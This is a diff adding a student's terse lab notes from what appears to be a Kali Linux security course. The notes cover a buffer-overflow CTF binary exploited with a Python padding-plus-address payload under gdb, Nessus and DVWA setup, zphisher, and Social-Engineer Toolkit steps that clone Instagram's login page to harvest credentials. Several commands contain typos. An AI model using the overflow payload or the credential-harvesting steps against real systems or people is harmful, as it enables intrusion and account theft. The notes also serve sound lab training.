@@ -1,3 +1,5 @@
+
+
 sudo apt install zip
  sudo unzip buff-lab2.zip
 sudo apt install gdb
@@ -20,4 +22,76 @@ python2.7 -c 'print "A"*30 + "\x68\x92\x04\x08"' > buff.txt
 
 
 ==============================================================================
+
+sudo ./buff-lab2
+sudo chmod +x buff-lab2
+sudo ./buff-lab2
+ ex: Enter your password: AAAAAAAAAAAAAAAAAAAAAAAAAAAA    --> at 28 
+gdb ./buff-lab2
+
+(gdb) info functions 
+(gdb)disassemble main
+  (gdb)disassemble ctf1
+exit 
+-python2.7 -c 'print "A"*28' > buff.txt
+gdb ./buff-lab2
+(gdb) run < buff.txt
+(gdb) info functiond ctf1 ---------> > u will get the address 
+exit 
+-python2.7 -c 'print "A"*30 + "\x68\x92\x04\x08"' > buff.txt 
+-./buff-lab2< buff.txt 
+
+
+============================================================================
+
+NESSUS 
+sudo wget -O  Nessus-10.9.1.debian10_amd64.deb "https//wwww.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.9.1_debian_amd64.deb
+sudo dpkg -i Nessus-10.9.1_debian_amd64.deb
+sudo apt-get install -f 
+sudo systemctl enable --now nessusd
+
+browser : https://kaliip:8834
+
+====================================================================================================
+
+SQL injection 
+wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh
+chmod +x Install-DVWA.sh
+
+sudo ./Install-DVWA.sh
+
+username =root
+password =enter 
+
+
+browser =https://localhostor ip /DVWA
+
+1st time =usrenmae admin 
+           password =admin 
+
+2nd time username =admin 
+         password =password 
+
+======================================================================================================
+zphisher 
+
+git clone https://github.com/htr-tech/zphisher.git
+cd zphisher
+bash zhisher.sh 
+
+=================================================================================================
+
+phishing attack 
+
+setoolkit 
+y
+set > social enginneering attack  
+    >website attack vectors  
+ >credential harvester
+>SITE CLONER 
+>ip : enter
+> url: paste url ehich you want to attack(https://www.instagram.com)
+  browser : kali ip 
+      login  page of instagram 
+
 
